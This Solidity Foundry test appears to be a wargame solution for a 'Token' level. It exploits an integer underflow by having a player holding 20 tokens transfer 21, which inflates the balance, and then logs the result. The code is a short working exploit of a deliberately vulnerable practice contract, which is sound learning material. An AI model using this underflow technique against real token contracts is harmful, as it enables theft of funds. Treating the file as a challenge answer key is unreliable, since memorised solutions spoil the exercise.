// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../instance/Level5.sol";
import "forge-std/Test.sol";

contract ExploitLevel5 is Test {
    Token instance = new Token(100_000);
    address player = 0x9606e11178a83C364108e99fFFD2f7F75C99d801;

    function setUp() external {
        instance.transfer(player, 20);
    }

    function testExploit() external {
        vm.prank(player);
        instance.transfer(address(0), 21);

        console.log("player's balance:", instance.balanceOf(player));
    }
}
